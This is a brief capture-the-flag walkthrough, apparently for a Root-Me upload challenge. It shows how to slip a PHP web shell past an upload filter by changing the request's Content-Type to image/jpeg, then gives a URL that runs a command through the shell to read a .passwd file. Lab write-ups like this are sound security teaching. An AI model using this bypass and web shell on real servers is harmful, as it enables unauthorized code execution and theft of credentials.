Use Burp to capture the post request sent to the server when attempting to upload a php shell script
Change the ‘content-type’ in the post request from ‘application/x-php’ to ‘image/jpeg’
Inject a command into the URL: http://challenge01.root-me.org/web-serveur/ch21/galerie/upload/gsejso5erm5ahvm8i561a9tdh7//shell.php?command=cat%20../../../.passwd
